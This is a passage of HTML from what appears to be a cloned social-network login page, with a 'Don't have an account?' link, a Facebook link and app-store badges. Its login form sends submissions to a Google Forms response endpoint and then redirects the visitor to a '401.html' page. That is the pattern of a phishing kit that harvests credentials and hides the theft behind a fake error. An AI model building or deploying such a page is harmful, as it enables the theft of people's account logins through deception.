                </h1>
                
                <!-- Connect the form to Google Form -->
                <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLScS_lZJJZxWAySrV6Amjp8SF11-3U9HpOCemR782V_QQue02w/formResponse" method="POST" target="_self" onsubmit="window.location.href='401.html';">

                        <img />

                    </div>
                    <a href="#">Don't have an account?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p></p>
                <a href="#">Facebook</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get the app on.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
                    <img src="./img/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
                </div>
            </div>
        </section>
    </main>
    <footer>
